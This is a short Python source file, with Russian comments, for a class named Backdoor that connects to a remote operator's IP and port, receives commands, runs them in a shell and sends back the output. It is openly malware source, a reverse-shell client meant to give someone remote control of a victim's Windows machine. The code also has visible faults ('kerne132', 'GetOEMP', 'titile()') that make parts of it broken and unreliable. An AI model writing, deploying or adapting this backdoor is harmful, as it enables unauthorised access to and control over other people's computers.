import socket
import subprocess, os, ctypes


class Backdoor:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port 
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def byte_text_to_normal(self, command):
        encode = os.device_encoding(1) or ctypes.windll.kerne132.GetOEMP()
        text = subprocess.check_output(command, encoding=encode, shell=True)
        return text

    def  execute_system_command(self, cmd):
        cmd_chdir = cmd.split(' ')
        try:
            #вернутся к предыдушей директории
            if cmd == 'cd..':
                result = os.getcwd().split('\\')[:-1]
                result = '\\'.join(result)
                os.chdir(result)
                self.connection.send(os.getcwd().encode('utf-8'))
            #поменять директорию
            elif cmd_chdir[0] == 'cd':
            #если длина строки равно 3 т.е C:/ или D:/  то просто сменить директорию на C:/ или D:/
                if len(cmd_chdir[1]) == 3 and cmd_chdir[1].titile():
                    os.chdir(cmd_chdir[1])
                    self.connection.send(os.getcwd().encode('utf-8'))
            #противном случаее просто сменить директорию прибавив к текушей директории указаное имя файла или папки
                else:
                    result = os.getcwd()
                    os.chdir(result + '\\' + cmd_chdir[1])
                    self.connection.send(os.getcwd().encode('utf-8'))
            #выпоолнить команду в любом случае
            else:
                result = self.byte_text_to_normal(cmd)
                self.connection.send(result.encode('utf-8'))
        except Exception:
            self.connection.send('[!] Some Error'.encode('utf-8'))

    def run_backdoor(self):
        self.connection.connect((self.ip, self.port))
        while True:
            command = self.connection.recv(1024).decode('utf-8')
            self.execute_system_command(command)
        self.connection.close()

if __name__ == '__main__':
    client = Backdoor('IP', 8080)
    client.run_backdoor()
